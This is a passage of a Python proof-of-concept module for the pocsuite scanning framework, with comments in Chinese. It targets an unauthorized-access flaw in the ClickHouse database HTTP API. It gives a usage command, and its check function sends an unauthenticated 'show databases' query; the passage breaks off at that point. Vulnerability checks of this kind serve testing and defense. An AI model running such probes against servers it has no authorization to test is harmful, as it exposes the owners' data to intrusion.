...
class clickhouse(POCBase):
    ...
    name = "ClickHouse API 数据库接口未授权访问漏洞"  # PoC 名称
    appPowerLink = ""  # 漏洞厂商主页地址
    appName = "clickhouse"  # 漏洞应用名称
    appVersion = "clickhouse"  # 漏洞影响版本
    vulType = VUL_TYPE.SQL_INJECTION  # SQL注入 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP  # poc对应的产品类型 web的
    # samples = []  # 测试样列,就是用 PoC 测试成功的网站
    # install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = """ClickHouse API 数据库接口存在未授权访问漏洞，攻击者通过漏洞可以执行任意SQL命令获取数据库数据"""  # 漏洞简要描述
    pocDesc = """pocsuite -r .\pocs\clickhouse.py -u <url>"""  # POC用法描述

    def _check(self):
        result = []
        full_url = f"{self.url}/?query=show%20databases"
